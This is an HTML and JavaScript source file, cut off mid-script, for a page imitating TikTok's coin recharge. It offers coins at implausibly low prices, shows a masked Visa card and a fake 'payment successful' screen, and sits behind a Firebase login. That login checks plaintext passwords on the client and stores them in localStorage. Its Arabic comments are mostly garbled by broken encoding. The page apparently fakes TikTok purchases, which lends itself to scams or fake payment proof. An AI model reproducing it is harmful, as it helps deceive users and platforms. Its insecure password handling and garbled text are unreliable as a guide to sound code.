
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <title>Coin Recharge TikTok</title>
  <link rel="manifest" href="manifest.json">
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@700&display=swap" rel="stylesheet">
  <style>
html, body {
  margin: 0;
  padding: 0;
  background: #fff;
  min-height: 100vh;
  overflow-x: hidden;
  overflow-y: hidden;
}
body {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: flex-start;
  min-height: 100vh;
  overflow-x: hidden;
  font-family: 'Tajawal', sans-serif;
  font-weight: bold;
}

  
  /* Ø§Ù„Ø®Ø§Ù†Ø© Ø§Ù„Ø®Ø§ØµØ© (3500) ÙƒØ¨Ø¯Ø§ÙŠØ© */
  .coin-option.special {
    border: 2px solid #ff2d55;
    background-color: #fff0f4;
  }

  .coin-option.special::before {
    content: "Ø¢Ø®Ø± Ø¹Ù…Ù„ÙŠØ© Ø´Ø±Ø§Ø¡";
    position: absolute;
    width: 83%;
    bottom: 66px;
    right: 18px;
    background: #ff2d55;
    color: #fff;
    font-size: 12px;
    padding: 2px 6px;
   border-radius: 12px 0 12px 0;
  }
  
  

  /* Ù„Ù…Ø§ ØªØªØ­ÙˆÙ„ Ø±Ù…Ø§Ø¯ÙŠ */
  .coin-option.special.gray {
    border: 2px solid transparent;
   background: #f2f2f2;
  }

  .coin-option.special.gray::before {
    background: #aaa;
  }


/* Ø¶Ø¨Ø· Ø®Ø§Øµ Ù„Ù„Ø®Ø§Ù†Ø© 17000 */
.coin-option[data-amount="17000"].special::before {
  width: 83% !important;
   bottom: 80px !important;
   right: 18px !important;
}

.coin-option[data-amount="17000"].special.gray::before {
  bottom: 80px;
  right: 18px;
}
#popupCoins {
  display: flex;
  align-items: center;
  gap: 4px;
}

#popupCoins .coin-img {
  width: 32px;
  height: 32px;
  position: relative;
  top: -3px; /* Ø§Ø±ÙØ¹ Ø§Ù„ØµÙˆØ±Ø© Ø´ÙˆÙŠÙ‡ Ù„ØªÙƒÙˆÙ† ÙÙŠ Ù…Ù†ØªØµÙ Ø§Ù„Ù†Øµ */
}

#popupCoins .coins-box {
  display: flex;
  align-items: center;  /* Ø§Ù„ØµÙˆØ±Ø© Ø¬Ù†Ø¨ Ø§Ù„ÙƒÙ„Ù…Ø© */
  gap: 4px;
  margin-top: 15px; /* Ù†Ø²Ù‘Ù„ Ø§Ù„Ø¹Ù†ØµØ± Ø´ÙˆÙŠØ© ØªØ­Øª */

}
    

/* Login overlay */
/* Ù†Ø®ÙÙŠ ÙƒÙ„ Ø­Ø§Ø¬Ø© Ù„Ø¯ Ù…Ø§ JS ÙŠÙ‚Ø±Ø± */
#loginOverlay {
  position: fixed;
  top: 0; left: 0; width: 100%; height: 100%;
  background: rgba(0,0,0,0.8);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 99999;
  opacity: 1;
  transition: opacity 0.2s ease-in-out;
}

/* ØµÙ†Ø¯ÙˆÙ‚ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ */
#loginBox {
  background: #fff;
  padding: 25px;
  border-radius: 16px;
  width: 90%;
  max-width: 350px;
  text-align: center;
  box-shadow: 0 4px 12px rgba(0,0,0,0.3);
}
#loginBox h2 { margin-bottom: 15px; font-size: 20px; color: #333; }
#loginBox input { width: 90%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #ccc; font-size: 16px; }
#loginBox button { background: #007bff; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 10px; }
#loginBox button:hover { background: #0056b3; }

.container { position: relative; margin-top: 25px; left: 44%; transform: translateX(-50%); max-width: 330px; }
.tiktok { color: red; }
#username { width: 95%; max-width: 350px; padding: 13px; font-size: 20px; margin: 0 auto 10px auto; display: block; border: 2px solid #ccc; border-radius: 10px; text-align: center; }

.coins { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
.coin-option { background: #f2f2f2; padding: 15px; border-radius: 12px; text-align: center; cursor: pointer; font-weight: 700; transition: 0.2s; font-size: 18px; position: relative; flex: 1 1 120px;} 
.coin-option.selected { border: 2px solid #ff2d55; background-color: #fff0f4; }
.coin-option small { display: block; margin-top: 6px; font-size: 13px; color: #777; font-weight: normal; }
.coin-option .coin-img { width: 32px; vertical-align: middle; margin-right: 4px; }
.custom-input { width: 80%; font-size: 16px; padding: 6px; border: none; background: transparent; text-align: center; font-weight: bold; margin-top: 6px; }

#charge, #payNow {
  width: 95%; padding: 15px; margin-top: 10px; background: rgba(200,200,200,0.5); cursor: not-allowed; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; position: relative; display:flex; align-items:center; justify-content:center;
}
#buttonLoader { display:none; width:15px; height:15px; border-radius:50%; border:3px solid #fff; border-top-color:transparent; animation: spin 0.8s linear infinite; margin:auto; }
@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
#charge.active { background: #ff2d55; cursor: pointer; }
#charge .btn-icon { width:20px; height:auto; display:none; position:absolute; top:48%; right:60px; transform:translateY(-50%); }
#charge.active .btn-icon { display:inline-block; }
/* Ø§Ù„Ù€ popup Ù†ÙØ³Ù‡ */
.popup {
  display: none;              /* Ù…Ø®ÙÙŠ Ø§ÙØªØ±Ø§Ø¶ÙŠ */
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  background: rgba(0,0,0,0.6); /* Ø®Ù„ÙÙŠØ© Ø´ÙØ§ÙØ© */
  justify-content: flex-end;   /* Ø§Ù„Ù…Ø­ØªÙˆÙ‰ ÙŠØ·Ù„Ø¹ Ù…Ù† ØªØ­Øª */
  align-items: flex-end;
  z-index: 1000;
  transition: all 0.3s ease;
}

.popup.show {
  display: flex;  /* Ù„Ù…Ø§ ÙŠØ¶Ø§Ù Ø§Ù„ÙƒÙ„Ø§Ø³ show ÙŠØ¨Ø§Ù† */
}

.popup-content {
  background: #fff;
  border-radius: 16px 16px 0 0;
  width: 100%;
  max-width: 400px;
  height: 64vh;
  max-height: 90%;
  overflow-y: hidden;
  display: flex;
  flex-direction: column;     /* ğŸ”¥ ØµÙ Ø¹Ù…ÙˆØ¯ÙŠ */
  justify-content: flex-start;/* ÙŠØ¨Ø¯Ø£ Ù…Ù† ÙÙˆÙ‚ Ù…Ø´ Ù…Ù† Ø§Ù„Ù†Øµ */
  align-items: center;        /* ØªÙˆØ³ÙŠØ· Ø£ÙÙ‚ÙŠ Ø¨Ø³ */
  gap: 10px;
  transform: translateY(100%);
  transition: transform 0.4s ease;
  padding-top: 60px;          /* Ù…Ø³Ø§ÙØ© ØµØºÙŠØ±Ø© ÙÙˆÙ‚ */
}

.popup.show .popup-content {
  transform: translateY(0); /* ØªØ·Ù„Ø¹ Ù„ÙÙˆÙ‚ */
}
    
/* Ø§Ù„Ø¹Ù†Ø§ØµØ± Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠØ© Ø§Ù„Ù„ÙŠ Ù‡ØªØ¸Ù‡Ø± Ø¨Ø¹Ø¯ Ø§Ù„Ù„ÙˆØ¯Ø± */
#popupDetails {
  display: none;
}
  
.popup-content * { margin:0; padding:0;
  /* Ù…Ù‡Ù… Ø¹Ø´Ø§Ù† ÙƒÙ„ Ø§Ù„Ø¹Ù†Ø§ØµØ± ØªØ¨Ø§Ù† ÙÙˆÙ‚ Ø§Ù„Ø®Ù„ÙÙŠØ© ÙÙ‚Ø· */
                  }
.payment-method { display:flex; align-items:center; justify-content:center; gap:10px; margin:0; }
.popup-header { margin-top:10px; display:flex; flex-direction:column; align-items:center; gap:10px; }
.popup-img { width:100%; border-radius:12px 12px 0 0; }
  


.card-inline {
  position: relative;
  width: 300px;
  height: auto;
  display:block;
  background: transparent; /* ğŸŸ¢ Ø®Ù„ÙŠ Ø§Ù„Ø®Ù„ÙÙŠØ© Ø´ÙØ§ÙØ© */
margin-top:10%;
}

.card-img {
  width: 100%;
  height: auto;
  position: relative;
  margin-top:0px;/* Ø±ÙØ¹ Ø§Ù„ØµÙˆØ±Ø© */
}

.card-number {
  position: absolute;
  top: 1px !important;
  left: 18px;
  font-size: 20px;
  font-weight: bold;
  color: black;
  letter-spacing: 3px;
}                  


#tiktok-loader {
  position: absolute;
  top: 5px;   /* Ø§Ù„Ù…Ø³Ø§ÙØ© Ù…Ù† ÙÙˆÙ‚ */
  left: 50%;
  transform: translateX(-50%); /* ÙŠØ®Ù„ÙŠÙ‡ ÙÙŠ Ø§Ù„Ù†Øµ Ø¨Ø§Ù„Ø¹Ø±Ø¶ */
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 10;
}

.orbit-loader {
  position: relative;
  width: 32px;
  height: 32px;
  display:flex;
  justify-content:center;
  align-items:center;
}
.dot {
  position: absolute;
  width:13px;
  height:13px;
  border-radius:50%;
  top:19px;
}
.dot1 {
  background-color: #ff0050;
  left:0;
  animation: orbit-left 1s ease-in-out infinite;
}
.dot2 {
  background-color: #00f2ea;
  right:0;
  animation: orbit-right 1s ease-in-out infinite;
}
@keyframes orbit-left {
  0% { transform: translateX(0); }
  50% { transform: translateX(10px);}
  100% { transform: translateX(0);}
}
@keyframes orbit-right {
  0% { transform: translateX(0);}
  50% { transform: translateX(-10px);}
  100% { transform: translateX(0);}
}
#successSection { display:none; margin-top:20px; }
#successSection img { width:100px; margin-bottom:10px; }
.top-image { width:200px; margin:10% auto 0; display:block; }

#hiddenBtn { position: fixed; bottom:5px; right:5px; font-size:10px; color:gray; opacity:0; width:20px; height:20px; background:white; border:none; cursor:pointer; z-index:9999; }
#logPopupContent { display:none; position:fixed; bottom:60px; left:10px; background:white; padding:10px; border:1px solid #ccc; border-radius:6px; z-index:999; max-height:200px; overflow-y:auto; }
.popup-small-img { width:300px; height:auto; align-self:flex-start; margin-bottom:10px; margin-left:10px; }

#payNow {
  width: 95%;
  padding: 14px;
  background: #ff2d55;
  color: white;
  border: none;
  border-radius: 8px;
  font-size: 18px;
  font-weight: bold;
  cursor: pointer;

  display: flex;
  align-items: center;   
  justify-content: center;  
  flex-direction: row-reverse; /* ğŸ‘ˆ Ø§Ù„ØµÙˆØ±Ø© ØªÙŠØ¬ÙŠ ÙŠÙ…ÙŠÙ† */
  gap: 6px;  

  margin: 0 auto;   /* ğŸ‘ˆ ÙŠØ®Ù„ÙŠ Ø§Ù„Ø²Ø± ÙÙŠ Ø§Ù„Ù†Øµ */
}

.total-row {
  display: flex;
  justify-content: space-between;
  width: 91%;
  margin: 0 auto 8px auto;  /* ğŸ‘ˆ Ø¯ÙŠ Ø§Ù„Ù„ÙŠ ØªØ®Ù„ÙŠ Ø§Ù„Ù†ØµÙˆØµ ÙÙŠ Ø§Ù„Ù†Øµ */
  font-size: 16px;
  font-weight: bold;
  color: #000;
  flex-direction: row-reverse;
}

.checkout-box {
  width: 100%;
  margin: 0 auto;
  display: flex;
  flex-direction: column; /* ğŸ‘ˆ Ø§Ù„Ù†Øµ ÙÙˆÙ‚ ÙˆØ§Ù„Ø²Ø± ØªØ­Øª */
  gap: 0px; /* ğŸ‘ˆ Ø§Ù„Ù…Ø³Ø§ÙØ© Ø¨ÙŠÙ† Ø§Ù„Ù†Øµ ÙˆØ§Ù„Ø²Ø± (Ø²ÙˆØ¯ Ø£Ùˆ Ù‚Ù„Ù„) */
 margin-top: 30%;
position: relative; /* ğŸ‘ˆ ÙƒØ¯Ø§ Ø§Ù„ØµÙˆØ±Ø© Ù‡ØªØªØ«Ø¨Øª Ø¬ÙˆÙ‡ */
}
 #popupImg {
  position: absolute;
  top: -50px;   /* ğŸ‘ˆ Ø§ØªØ­ÙƒÙ… ÙÙŠ Ø§Ø±ØªÙØ§Ø¹Ù‡Ø§ */
  left: 50%;
  transform: translateX(-50%);
  width: 200px;     /* ğŸ‘ˆ Ø¹Ø±Ø¶ Ø§Ù„ØµÙˆØ±Ø© */
  max-width: 90%;   /* ğŸ‘ˆ ØªÙ…Ù†Ø¹Ù‡Ø§ ØªØªÙ‚Ø·Ø¹ Ù„Ùˆ Ø§Ù„Ø´Ø§Ø´Ø© ØµØºÙŠØ±Ø© */
  border-radius: 0; /* ğŸ‘ˆ Ø®Ù„ÙŠÙ‡Ø§ Ø²ÙŠ Ù…Ø§ Ù‡ÙŠ Ø¨Ø¯ÙˆÙ† ØªÙ‚Ø·ÙŠØ¹ */
  object-fit: contain; /* ğŸ‘ˆ ØªØ¹Ø±Ø¶Ù‡Ø§ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„ Ø¨Ø¯ÙˆÙ† Ù‚Øµ */
}

.total-row span {
  margin-top: 0px;   /* ğŸ‘ˆ ÙŠÙ†Ø²Ù„ Ø§Ù„Ù†Øµ Ù„ØªØ­Øª Ø¹Ù† Ù…ÙƒØ§Ù†Ù‡ */
}
/* Ø§Ù„Ø¬Ø²Ø¡ Ø§Ù„Ù„ÙŠ ÙÙˆÙ‚ (Total + Ø§Ù„Ù…Ø¨Ù„Øº) */
/* ğŸ”¹ Ø§Ù„ØµÙ ÙƒÙ„Ù‡ */
/* ğŸ”¹ Ø§Ù„Ù‡ÙŠØ¯Ø± */

#payNow .btn-icon { width:20px; height:auto; }

  </style>
</head>
<body>

<button id="installBtn" style="display:none; position: fixed; bottom: 10px; right: 10px; padding:10px 20px; z-index:9999;">ØªØ«Ø¨ÙŠØª Ø§Ù„ØªØ·Ø¨ÙŠÙ‚</button>
<div id="logPopupContent"><ul id="logsList"></ul></div>

<div id="loginOverlay">
  <div id="loginBox">
    <h2>ğŸ” Secure Login</h2>
    <input type="text" id="deviceInput" placeholder="Enter Device ID" />
    <input type="password" id="passwordInput" placeholder="Enter Password" />
    <button id="loginBtn">Login</button> </div>
</div>

<div id="mainContent" style="display:none;">
  <!-- Ù…Ø­ØªÙˆÙ‰ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø¨Ø¹Ø¯ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ -->
</div>

<div class="container">
  <h1><span class="tiktok"></span></h1>
  <input type="text" id="username" placeholder="Username" />
</div>
<div class="coins">
  <div class="coin-option" data-amount="30">
    <img src="coin.png" class="coin-img" alt="coin">
    30
    <small>$0.01</small>
  </div>
  <div class="coin-option" data-amount="350">
    <img src="coin.png" class="coin-img" alt="coin">
    350
    <small>$0.06</small>
  </div>
  <div class="coin-option" data-amount="700">
    <img src="coin.png" class="coin-img" alt="coin">
    700
    <small>$0.12</small>
  </div>
  <div class="coin-option" data-amount="1400">
    <img src="coin.png" class="coin-img" alt="coin">
    1,400
    <small>$0.25</small>
  </div>
  <!-- Ø§Ù„Ø®Ø§Ù†Ø© Ø§Ù„Ø®Ø§ØµØ© -->
  <div class="coin-option special" data-amount="3500">
    <img src="coin.png" class="coin-img" alt="coin">
    3,500
    <small>$0.62</small>
  </div>
  <div class="coin-option" data-amount="7000">
    <img src="coin.png" class="coin-img" alt="coin">
    7,000
    <small>$1.24</small>
  </div>
  <div class="coin-option" data-amount="17000">
    <img src="coin.png" class="coin-img" alt="coin">
    17,000
    <small>$3.00</small>
  </div>
  <!-- Ø®Ø§Ù†Ø© custom -->
  <div class="coin-option custom">
    Custom
    <div id="customPrice" style="font-size: 12px; color: gray; margin-top: 4px;"></div>
    <input type="number" id="customAmount" class="custom-input" placeholder="..Number of " />
  </div>
</div>

<img src="pay12.png" alt="Pay Image" class="top-image">
<div style="width: 100%; display: flex; justify-content: center; margin-top: -5px;">
  <button id="charge">
    <img src="hos2.png" class="btn-icon" alt="">
    <span id="chargeText">Recharge</span>
    <span id="buttonLoader" class="loader"></span>
  </button>
</div>


<div id="paymentPopup" class="popup">
  <div class="popup-content">
    
    <!-- ğŸ”¹ Ø§Ù„Ù„ÙˆØ¯Ø± -->
    <div id="tiktok-loader">
      <div class="orbit-loader">
        <div class="dot dot1"></div>
        <div class="dot dot2"></div>
      </div>
    </div>

    <!-- ğŸ”¹ ØµÙ Ø§Ù„Ø¹Ù†ÙˆØ§Ù† -->
<!-- Ø§Ù„Ù‡ÙŠØ¯Ø± Ø¬ÙˆÙ‡ Ø§Ù„Ø¨ÙˆØ¨ -->

  <!-- Ø¨Ù‚ÙŠØ© Ù…Ø­ØªÙˆÙ‰ Ø§Ù„Ø¨ÙˆØ¨ Ù‡Ù†Ø§ --> 

    <div id="popupDetails">  
  <img src="hos1.png" alt="ØµÙˆØ±Ø©" class="popup-img">  

  <div class="popup-header">  
    <p id="popupUser"></p>  
    <p id="popupCoins"></p>  

    
    <!-- Ø§Ù„ØµÙˆØ±Ø© ÙˆØ§Ù„Ø±Ù‚Ù… Ù…Ø¨Ø§Ø´Ø±Ø© Ø¨Ø¯ÙˆÙ† Ø£ÙŠ ØµÙ†Ø¯ÙˆÙ‚ -->
    
    <!-- Ø§Ù„ØµÙˆØ±Ø© ÙˆØ§Ù„Ø±Ù‚Ù… Ø¬Ù†Ø¨ Ø¨Ø¹Ø¶ Ù…Ø¨Ø§Ø´Ø±Ø© -->
    
<div class="card-inline">
  <img src="visa.png" alt="Visa" class="card-img">
  <span class="card-number">2432*** *** *** ***</span>
</div>
  </div>             
   
    <!-- ğŸ”¹ Ø§Ù„ØµÙˆØ±Ø© ÙÙŠ id -->
    
    <!-- Ø¨Ø§Ù‚ÙŠ ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ø¨ÙˆØ¨ -->
<!-- Ø§Ù„Ù†Øµ Ø§Ù„Ù„ÙŠ ÙÙˆÙ‚ Ø§Ù„Ø²Ø± -->
<div class="checkout-box">

  

  <!-- Ø§Ù„ØµÙ Ø¨ØªØ§Ø¹ Total -->
  <div class="total-row">
    <span class="total-text">Total</span>
    <span id="totalAmount">$0.00</span>
  </div>
  <img id="popupImg" src="pay12.png" alt="Pay">
  <!-- Ø²Ø±Ø§Ø± Ø§Ù„Ø¯ÙØ¹ -->
  <button id="payNow" class="pay-btn">
    <span>Pay now</span>
    <img src="hos2.png" alt="icon" class="btn-icon" />
  </button>
        
      </div>
    </div>
    
  </div>
</div>

    <div id="successSection">
      <img src="success.png" alt="Ù†Ø¬Ø§Ø­">
      <p>âœ… ØªÙ… Ø§Ù„Ø¯ÙØ¹ Ø¨Ù†Ø¬Ø§Ø­!</p>
    </div>

  </div>
</div>

<audio id="clickSound" src="click.mp3"></audio>
<audio id="successSound" src="success.mp3"></audio>
<audio id="typeSound" src="type.mp3"></audio>
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
  import { getFirestore, doc, getDoc, setDoc, collection } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";

// ğŸ”¹ Ø¥Ø¹Ø¯Ø§Ø¯ Firebase
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyD0ErbW4GMP2EFIbp6fEUaHwowXr-O3Tiw",
  authDomain: "hosny87-edb64.firebaseapp.com",
  projectId: "hosny87-edb64",
  storageBucket: "hosny87-edb64.appspot.com", // âœ… Ø§Ù„ØªØµØ­ÙŠØ­ Ù‡Ù†Ø§
  messagingSenderId: "390181932130",
  appId: "1:390181932130:web:307629cd4408514f61d53b",
  measurementId: "G-5HXSPP373X"
};
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// ğŸ”¹ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
async function checkLogin() {
  const userId = document.getElementById("deviceInput").value.trim();
  const enteredPassword = document.getElementById("passwordInput").value.trim();

  if (!userId || !enteredPassword) { 
    alert("âš ï¸ Ø§ÙƒØªØ¨ ID ÙˆÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±"); 
    return; 
  }

  try {
    const docRef = doc(db, "users", userId);
    const docSnap = await getDoc(docRef);

    if (docSnap.exists()) {
      const correctPassword = docSnap.data().password;
      if (enteredPassword === correctPassword) {
        // âœ… Ù†Ø¬Ø§Ø­ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
        localStorage.setItem("loggedIn", "true");
        localStorage.setItem("userId", userId);
        localStorage.setItem("password", enteredPassword);

        // ğŸ“Œ Ù‡Ù†Ø§ Ø¨Ù†Ø³Ø¬Ù„ Ø§Ù„Ø¬Ù‡Ø§Ø² ÙÙŠ Firestore

// ğŸ“Œ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¬Ù‡Ø§Ø² ÙÙŠ Firestore Ø¨Ø¹Ø¯ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯
if (docSnap.exists() && docSnap.data().password === enteredPassword) {
  // âœ… Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ù…Ø­ØªÙˆÙ‰ ÙˆØ¥Ø®ÙØ§Ø¡ Ø´Ø§Ø´Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
  document.getElementById('loginOverlay').style.display = 'none';
  document.getElementById("mainContent").style.display = 'block';

  // â° Ø¥Ù†Ø´Ø§Ø¡ ID Ø¹Ø´ÙˆØ§Ø¦ÙŠ Ù„Ù„Ø¬Ù‡Ø§Ø²
  const deviceId = crypto.randomUUID();
  const deviceRef = doc(collection(db, "users", userId, "devices"), deviceId);

  // â° Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ø­Ø§Ù„ÙŠ
  const now = new Date();

  // ğŸ“ Ø­ÙØ¸ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ÙÙŠ Firestore
  await setDoc(deviceRef, {
    device: getDeviceName(),
    loginTime: formatDateTime(now)
  });

  return; // âœ… ÙˆÙ‚Ù Ø§Ù„ÙƒÙˆØ¯ Ù‡Ù†Ø§ Ø¨Ø¹Ø¯ Ø§Ù„Ø­ÙØ¸
}

// â° Ø¯Ø§Ù„Ø© Ù„ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ÙˆÙ‚Øª Ø¨Ø´ÙƒÙ„ Ù…Ù‚Ø±ÙˆØ¡
function formatDateTime(date) {
  return date.getFullYear() + "-" +
    String(date.getMonth() + 1).padStart(2, '0') + "-" +
    String(date.getDate()).padStart(2, '0') + " " +
    String(date.getHours()).padStart(2, '0') + ":" +
    String(date.getMinutes()).padStart(2, '0') + ":" +
    String(date.getSeconds()).padStart(2, '0');
}

// ğŸ”¹ Ø¯Ø§Ù„Ø© Ù„ØªØ­Ø¯ÙŠØ¯ Ø§Ø³Ù… Ø§Ù„Ø¬Ù‡Ø§Ø² Ø£Ùˆ Ø§Ù„Ø´Ø±ÙƒØ©
function getDeviceName() {
  if (navigator.userAgentData) {
    // âœ… Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„Ø­Ø¯ÙŠØ«Ø© (Chrome Ø§Ù„Ø¬Ø¯ÙŠØ¯)
    const brands = navigator.userAgentData.brands.map(b => b.brand).join(", ");
    const platform = navigator.userAgentData.platform;
    return `${platform} (${brands})`;
  } else {
    // âœ… Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„ØªÙ‚Ù„ÙŠØ¯ÙŠØ© (userAgent)
    const ua = navigator.userAgent;

    if (/samsung|sm-/i.test(ua)) return "Samsung";
    if (/huawei|honor/i.test(ua)) return "Huawei / Honor";
    if (/xiaomi|redmi|mi\s/i.test(ua)) return "Xiaomi";
    if (/oppo/i.test(ua)) return "Oppo";
    if (/vivo/i.test(ua)) return "Vivo";
    if (/nokia/i.test(ua)) return "Nokia";
    if (/iphone/i.test(ua)) return "iPhone";
    if (/ipad/i.test(ua)) return "iPad";
    if (/macintosh/i.test(ua)) return "Mac";
    if (/windows/i.test(ua)) return "Windows";
    if (/linux/i.test(ua)) return "Linux";

    return "Unknown Device";
  }
  }

// ğŸ”¹ Ø¯Ø§Ø®Ù„ checkLogin Ø¨Ø¹Ø¯ Ù…Ø§ ÙŠØªØ£ÙƒØ¯ Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯ ØµØ­
document.getElementById('loginOverlay').style.display = 'none';
document.getElementById("mainContent").style.display = "block";

// Ù…Ø¬Ø±Ø¯ Ù„ÙˆØ¬ ÙÙŠ Ø§Ù„ÙƒÙˆÙ†Ø³ÙˆÙ„ ÙŠÙˆØ±ÙŠÙƒ Ø§Ù„Ø¬Ù‡Ø§Ø²
console.log("ğŸ“± Ø¬Ù‡Ø§Ø²Ùƒ: " + getDeviceName());
alert("âœ… ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­");   
        
        document.getElementById('loginOverlay').style.display = 'none';
        document.getElementById("mainContent").style.display = "block";
        alert("âœ… ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­");
      } else {
        alert("âŒ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ØºÙ„Ø·");
      }
    } else {
      alert("âŒ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø´ Ù…ÙˆØ¬ÙˆØ¯");
    }
  } catch (e) {
    console.error(e);
    alert("âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ù€ Firestore");
  }
}

// ğŸ”¹ Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
document.addEventListener('DOMContentLoaded', async () => {
  const loginBtn = document.getElementById("loginBtn");
  loginBtn.addEventListener("click", checkLogin);

  const loggedIn = localStorage.getItem("loggedIn");
  const userId = localStorage.getItem("userId");
  const savedPassword = localStorage.getItem("password");

  if (loggedIn === "true" && userId && savedPassword) {
    try {
      const docRef = doc(db, "users", userId);
      const docSnap = await getDoc(docRef);
      if (docSnap.exists() && docSnap.data().password === savedPassword) {
        document.getElementById('loginOverlay').style.display = 'none';
        document.getElementById("mainContent").style.display = 'block';
        return;
      }
    } catch(e) { console.error(e); }
  }

  // Ù„Ùˆ Ù…Ø´ Ù…ØªØ³Ø¬Ù„ Ø¯Ø®ÙˆÙ„
  document.getElementById('loginOverlay').style.display = 'flex';
  document.getElementById("mainContent").style.display = 'none';
});




  window.addEventListener('DOMContentLoaded', () => {
  const chargeButton = document.getElementById('charge');
  const customInput = document.getElementById('customAmount');
  const popup = document.getElementById('paymentPopup');
  const payNowBtn = document.getElementById('payNow');
  const loader = document.getElementById('tiktok-loader');
  const clickSound = document.getElementById('clickSound');
  let deferredPrompt;

  function selectCustom() {
    document.querySelectorAll('.coin-option').forEach(e => e.classList.remove('selected'));
    document.querySelector('.coin-option.custom').classList.add('selected');
  }

  // link the custom element WITHOUT inline onclick
  const customOption = document.querySelector('.coin-option.custom');
  if (customOption) customOption.addEventListener('click', selectCustom);

  function updateChargeText(price) {
    document.getElementById('chargeText').textContent = `Recharge ${price} USD`;
  }

  function updateChargeCoins(amount) {
    if (amount > 0) chargeButton.classList.add('active');
    else chargeButton.classList.remove('active');
  }

  if (customInput) {
    customInput.addEventListener('input', (e) => {
      selectCustom();
      const value = parseInt(e.target.value) || 0;
      const price = (value * 3 / 17000).toFixed(2);
      updateChargeText(price);
      document.getElementById('customPrice').textContent = value > 0 ? `${price} $` : '';
      updateChargeCoins(value);
    });
  }

  document.querySelectorAll('.coin-option:not(.custom)').forEach(option => {
    option.addEventListener('click', () => {
      document.querySelectorAll('.coin-option').forEach(e => e.classList.remove('selected'));
      option.classList.add('selected');
      const value = parseInt(option.dataset.amount);
      const price = (value * 3 / 17000).toFixed(2);
      updateChargeText(price);
      updateChargeCoins(value);
    });
  });

  document.querySelectorAll('button, .coin-option, #username, #customAmount').forEach(el => {
    el.addEventListener('click', () => { 
      clickSound.currentTime = 0; 
      clickSound.play(); 
    });
  });

  // Ø²Ø± Ø§Ù„Ø´Ø­Ù† - Ø¨Ø³ ÙŠØ¹Ø±Ø¶ Ø§Ù„Ø¨ÙˆØ¨ Ø£Ø¨
// ===== ÙØªØ­ Ø§Ù„Ø¨ÙˆØ¨ ÙˆØ¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ù„ÙˆØ¯Ø± Ø£ÙˆÙ„ Ù…Ø±Ø© =====
chargeButton.addEventListener('click', () => {
  if (!chargeButton.classList.contains('active')) return;

  const textSpan = document.getElementById('chargeText');
  const imgIcon = document.querySelector('#charge .btn-icon');
  const loaderSpan = document.getElementById('buttonLoader');

  loaderSpan.style.display = 'block';
  textSpan.style.display = 'none';
  if (imgIcon) imgIcon.style.display = 'none';

  setTimeout(() => {
    loaderSpan.style.display = 'none';
    textSpan.style.display = 'inline';
    if (imgIcon) imgIcon.style.display = 'inline';

    const username = document.getElementById('username').value || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
    const selected = document.querySelector('.coin-option.selected');
    const coins = selected
      ? (selected.classList.contains('custom') ? (customInput.value || "0") : selected.dataset.amount)
      : (customInput.value || "0");
// Ø¨Ø¹Ø¯ Ù…Ø§ Ù†Ø­Ø³Ø¨ Ø§Ù„Ø³Ø¹Ø± Ù…Ù† Ø²Ø± Ø§Ù„Ø´Ø­Ù†
let price;

if (selected) {
  if (selected.classList.contains("custom")) {
    // Ù„Ùˆ Ø§Ø®ØªØ§Ø± Ø®Ø§Ù†Ø© Ø§Ù„Ù…Ø®ØµØµ
    const customAmount = document.getElementById("customAmount").value || 0;
